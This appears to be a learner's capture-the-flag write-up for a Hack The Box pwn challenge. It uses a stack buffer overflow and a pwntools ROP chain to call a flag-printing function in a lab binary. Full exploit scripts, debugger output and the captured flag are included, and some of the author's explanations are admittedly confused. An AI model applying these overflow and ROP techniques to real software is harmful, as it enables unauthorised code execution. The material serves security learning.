We see a main function:
```c
undefined8 main(void)

{
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  banner();
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  fflush(stdout);
  printf(
        "\nPrepare for trouble and make it double, or triple..\n\nYou need to place the ammo in the  right place to load the Rocket Blaster XXX!\n\n>> "
        );
  fflush(stdout);
  read(0,&local_28,0x66);
  puts("\nPreparing beta testing..");
  return 0;
}

```

There's clearly an overflow intended on read...
And here's another function:
```c
void fill_ammo(long param_1,long param_2,long param_3)

{
  ssize_t sVar1;
  char local_d;
  int local_c;
  
  local_c = open("./flag.txt",0);
  if (local_c < 0) {
    perror("\nError opening flag.txt, please contact an Administrator.\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (param_1 != 0xdeadbeef) {
    printf("%s[x] [-] [-]\n\n%sPlacement 1: %sInvalid!\n\nAborting..\n",&DAT_00402010,&DAT_00402008,
           &DAT_00402010);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (param_2 != 0xdeadbabe) {
    printf(&DAT_004020c0,&DAT_004020b6,&DAT_00402010,&DAT_00402008,&DAT_00402010);
                    /* WARNING: Subroutine does not return */
    exit(2);
  }
  if (param_3 != 0xdead1337) {
    printf(&DAT_00402100,&DAT_004020b6,&DAT_00402010,&DAT_00402008,&DAT_00402010);
                    /* WARNING: Subroutine does not return */
    exit(3);
  }
  printf(&DAT_00402140,&DAT_004020b6);
  fflush(stdin);
  fflush(stdout);
  while( true ) {
    sVar1 = read(local_c,&local_d,1);
    if (sVar1 < 1) break;
    fputc((int)local_d,stdout);
  }
  close(local_c);
  fflush(stdin);
  fflush(stdout);
  return;
}

```

The goal seems to reach the fill ammo function, with the right parameters on stack.
Afterwards, it will read the file flag.txt.

So first, we need to override the return value of our function.

On ghidra, we can see this line:
```                         
undefined8        Stack[-0x28]:8 local_28      
```

Which tells us that our return buffer is 0x28 bytes below EBP.
Also, since we're in 64 bits mode, our return value is 8 bytes above EBP.

With these informations, we can guess that we need -0x28-0x8 = 0x30 bytes to override the program adress.

But that doesn't work, maybe i missunderstood.

I'm going to use a tool i didn't knew, `msf-pattern`.

Basically, it creates a long string with special patterns, and you can then use it to identify at which offset the pattern occured.

For example, in my program:
I input the following string i generated:
```
msf-pattern_create -l 200

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```


And then, using GDB, i'm seeing this once the segfault occured:
```
 ► 0x401588 <main+142>    ret    <0x3562413462413362>
```

So now, i'm going to ask msf-pattern to give me the offset.

And here is what i get :
```
msf-pattern_offset -q 0x3562413462413362
[*] Exact match at offset 40
```

My offset was 40, so it was 0x28, i was wrong !

I can now try with the following payload to confirm the offset:

`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB` (32A and 8 B = 32)

We can see that we edited RSP successfully !
```
 RBP  0x4141414141414141 ('AAAAAAAA')
 RSP  0x7fffffffdce8 ◂— 'BBBBBBBB\n'
 RIP  0x401588 (main+142) ◂— ret 

 ► 0x401588 <main+142>    ret    <0x4242424242424242>
```


Fill ammo:
```
disass fill_ammo                                                                                                       
Dump of assembler code for function fill_ammo:            
   0x00000000004012f5 <+0>:     endbr64
```

So we want to write `4012f5` instead of our 'BBBBBBBB'.

I generated a payload using python and pwntools, and sent it to GDB using 
`r < input.txt` to avoid any miss-treatment of my input.

After putting a breakpoint to the beginning of fill_ammo...
I see that we reached it !

```
pwndbg> b *0x4012f5                                                                                                             
Breakpoint 1 at 0x4012f5
pwndbg> r < input2.txt 

[...]

*RSP  0x7fffffffdcf0 ◂— 0xdeadbeef
*RIP  0x4012f5 (fill_ammo) ◂— endbr64 

 DISASM / x86-64 / set emulate on 
 ► 0x4012f5 <fill_ammo>       endbr64 
   0x4012f9 <fill_ammo+4>     push   rbp
```

And in fact, i had to pass args inside registers, and not in stack, because it's 64 bits.

So i used ROP gadget chain, to set my registers before running the function !

```python
from pwn import *

LOCAL_FILE_PATH: str = "./rocket_blaster_xxx"
REMOTE_SERVER = "94.237.63.83"
REMOTE_PORT = 46473


def find_gadgets(binary_path):
    elf = ELF(binary_path)
    rop = ROP(elf)

    # Search for gadgets to set up RDI, RSI, and RDX registers
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
    pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
    pop_rdx = rop.find_gadget(['pop rdx', 'ret']).address

    return pop_rdi, pop_rsi, pop_rdx

def pwn_rocket_blaster(proc):
    pop_rdi, pop_rsi, pop_rdx = find_gadgets(LOCAL_FILE_PATH)

    # Receive until the prompt
    proc.recvuntil(b">> ")

    # Addresses and arguments
    fill_ammo_addr = 0x4012f5
    arg1 = 0xdeadbeef
    arg2 = 0xdeadbabf
    arg3 = 0xdead1337

    # Padding to reach the return address
    padding = b"A" * 40

    # Construct the payload
    payload = padding
    payload += p64(pop_rdi) + p64(arg1)  # Set RDI
    payload += p64(pop_rsi) + p64(arg2)  # Set RSI
    payload += p64(pop_rdx) + p64(arg3)  # Set RDX
    payload += p64(fill_ammo_addr)  # Address of fill_ammo

    # Send the payload
    proc.sendline(payload)
    with open ('input2.txt', 'wb') as out:
        out.write(payload)


    print(f"Trying payload: {payload}")

    # Try to receive the response
    try:
        res = proc.recvall(timeout=2) 
        print(res.decode())
    except EOFError:
        print("Process exited before receiving all data.")


def run_remote():
    conn = remote(REMOTE_SERVER, REMOTE_PORT)
    pwn_rocket_blaster(conn)

def run_bin_local(process_path: str):
    proc = process([process_path])
    pwn_rocket_blaster(proc)

def main():
    run_bin_local(LOCAL_FILE_PATH)
    #run_remote()

if __name__ == '__main__':
    main()
```

Running this *almost* works :)

I'm just stuck at the print function... after the registers checks.

```c
# This line fails:
  printf(&DAT_00402140,&DAT_004020b6);
  fflush(stdin);
  fflush(stdout);
  while( true ) {
    sVar1 = read(local_c,&local_d,1);
    if (sVar1 < 1) break;
    fputc((int)local_d,stdout);
  }
  close(local_c);
  fflush(stdin);
  fflush(stdout);
  return;
```

When digging deeper, it crashes when printf calls another function...
```
0x7ffff7c6078f <printf+159> mov rdi, qword ptr [rax] 
0x7ffff7c60792 <printf+162> mov dword ptr [rsp + 4], 0x30 
► 0x7ffff7c6079a <printf+170> call 0x7ffff7c75030
```

And inside that function, it crashes when using weird registers that i don't know...
```
► 0x7ffff7c750d0 movaps xmmword ptr [rsp + 0x10], xmm1
```

I guess that might be a problem from my RSP, but some lines using RSP already worked so that'd be weird.



My code was this:

```python
from pwn import *

LOCAL_FILE_PATH: str = "./rocket_blaster_xxx"
REMOTE_SERVER = "94.237.63.83"
REMOTE_PORT = 46473


def find_gadgets(binary_path):
    elf = ELF(binary_path)
    rop = ROP(elf)

    # Search for gadgets to set up RDI, RSI, and RDX registers
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
    pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
    pop_rdx = rop.find_gadget(['pop rdx', 'ret']).address
    return pop_rdi, pop_rsi, pop_rdx

def pwn_rocket_blaster(proc):
    pop_rdi, pop_rsi, pop_rdx = find_gadgets(LOCAL_FILE_PATH)

    # Receive until the prompt
    proc.recvuntil(b">> ")

    # Addresses and arguments
    fill_ammo_addr = 0x4012f5
    arg1 = 0xdeadbeef
    arg2 = 0xdeadbabe
    arg3 = 0xdead1337

    # Padding to reach the return address
    padding = b"A" * 40
    
    # Construct the payload
    payload = padding
    payload += p64(pop_rdi) + p64(arg1)  # Set RDI
    payload += p64(pop_rsi) + p64(arg2)  # Set RSI
    payload += p64(pop_rdx) + p64(arg3)  # Set RDX
    payload += p64(fill_ammo_addr)  # Address of fill_ammo
    #payload = b"A" * 1000

    # Send the payload
    proc.sendline(payload)
    with open ('input2.txt', 'wb') as out:
        out.write(payload)


    print(f"Trying payload: {payload}")

    # Try to receive the response
    try:
        res = proc.recvall(timeout=2) 
        print(res.decode())
    except EOFError:
        print("Process exited before receiving all data.")


def run_remote():
    conn = remote(REMOTE_SERVER, REMOTE_PORT)
    pwn_rocket_blaster(conn)

def run_bin_local(process_path: str):
    proc = process([process_path])
    pwn_rocket_blaster(proc)

def main():
    run_bin_local(LOCAL_FILE_PATH)
    #run_remote()

if __name__ == '__main__':
    main()
```

I didn't get why it happenned, so i tried to call the "open" function before jumping directly to the read part of the fill_ammo function.

But...
I got the flag ? I don't get why, since i only called "open" without any args, and that fixed my exploit...

Pwn is really something. I'll need to get back to this challenge once i know Pwn better...

Here's the final code:

```python
from pwn import *

LOCAL_FILE_PATH: str = "./rocket_blaster_xxx"
REMOTE_SERVER = "94.237.63.83"
REMOTE_PORT = 46473


def find_gadgets(binary_path):
    elf = ELF(binary_path)
    rop = ROP(elf)

    # Search for gadgets to set up RDI, RSI, and RDX registers
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
    pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
    pop_rdx = rop.find_gadget(['pop rdx', 'ret']).address
    open_plt = elf.plt['puts']
    return pop_rdi, pop_rsi, pop_rdx, open_plt

def pwn_rocket_blaster(proc):
    pop_rdi, pop_rsi, pop_rdx ,open_plt = find_gadgets(LOCAL_FILE_PATH)

    # Receive until the prompt
    proc.recvuntil(b">> ")

    # Addresses and arguments
    fill_ammo_addr = 0x4012f5
    arg1 = 0xdeadbeef
    arg2 = 0xdeadbabe
    arg3 = 0xdead1337

    print(open_plt)

    # Padding to reach the return address
    padding = b"A" * 40
    
    # Construct the payload
    payload = padding
    payload += p64(open_plt)
    payload += p64(pop_rdi) + p64(arg1)  # Set RDI
    payload += p64(pop_rsi) + p64(arg2)  # Set RSI
    payload += p64(pop_rdx) + p64(arg3)  # Set RDX
    payload += p64(fill_ammo_addr)  # Address of fill_ammo
    #payload = b"A" * 1000

    # Send the payload
    proc.sendline(payload)
    with open ('input2.txt', 'wb') as out:
        out.write(payload)


    print(f"Trying payload: {payload}")

    # Try to receive the response
    try:
        res = proc.recvall(timeout=2) 
        print(res.decode())
    except EOFError:
        print("Process exited before receiving all data.")


def run_remote():
    conn = remote(REMOTE_SERVER, REMOTE_PORT)
    pwn_rocket_blaster(conn)

def run_bin_local(process_path: str):
    proc = process([process_path])
    pwn_rocket_blaster(proc)

def main():
    run_bin_local(LOCAL_FILE_PATH)
    #run_remote()

if __name__ == '__main__':
    main()
```

Final output with flag ! :)
```python
Trying payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAd\x11@\x00\x00\x00\x00\x00\x9f\x15@\x00\x00\x00\x00\x00\xef\xbe\xad\xde\x00\x00\x00\x00\x9d\x15@\x00\x00\x00\x00\x00\xbe\xba\xad\xde\x00\x00\x00\x00\x9b\x15@\x00\x00\x00\x00\x007\x13\xad\xde\x00\x00\x00\x00\xf5\x12@\x00\x00\x00\x00\x00'
[+] Receiving all data: Done (140B)
[*] Closed connection to 94.237.49.121 port 48759

Preparing beta testing..
[✓] [✓] [✓]

All Placements are set correctly!

Ready to launch at: HTB{b00m_b00m_r0ck3t_2_th3_m00n}
```

